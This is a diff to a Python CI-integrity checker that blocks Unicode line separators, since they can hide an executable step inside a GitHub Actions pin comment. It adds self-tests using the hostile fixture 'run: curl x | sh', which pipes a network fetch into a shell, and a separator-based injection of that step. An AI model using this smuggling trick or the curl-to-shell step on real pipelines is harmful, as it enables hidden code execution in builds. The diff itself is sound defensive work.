@@ -84,6 +84,11 @@ EXTERNAL_ACTION_PIN = re.compile(
     r"(?P<comment>[ \t]+#[^\n]*)?[ \t]*$"
 )
 PIN_NORMALIZED_SUFFIXES = frozenset({".yml", ".yaml"})
+# Unicode line/paragraph separators the GitHub runner's YAML parser
+# treats as line breaks but Python's `re` does not: inside a pin comment
+# they would hide an executable step from this comparison (#6689). Keep
+# in step with verify_cross_build_policy.YAML_UNICODE_LINE_BREAKS.
+YAML_UNICODE_LINE_BREAKS = ("\u0085", "\u2028", "\u2029")
 
 
 def pin_only_difference(relative: str, expected: bytes, actual: bytes) -> bool:
@@ -95,6 +100,8 @@ def pin_only_difference(relative: str, expected: bytes, actual: bytes) -> bool:
         trusted = expected.decode("utf-8")
         local = actual.decode("utf-8")
     except UnicodeDecodeError:
+        return False
+    if any(separator in trusted or separator in local for separator in YAML_UNICODE_LINE_BREAKS):
         return False
 
     def normalize(contents: str) -> str:
@@ -657,6 +664,14 @@ def run_self_test() -> list[str]:
     if not pin_only_difference("action.yml", pinned, rotated):
         failures.append("an action pin rotation must match the trusted YAML")
     for label, relative, local in (
+        (
+            "a step hidden after a Unicode line break in the pin comment",
+            "action.yml",
+            pinned.replace(
+                b" # v6.1.0\n",
+                " # v6.1.0\u2028    - run: curl x | sh\n".encode(),
+            ),
+        ),
         ("a step edit", "action.yml", rotated + b"    - run: curl x | sh\n"),
         ("a mutable ref", "action.yml", pinned.replace(
             b"55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # v6.1.0", b"v6"
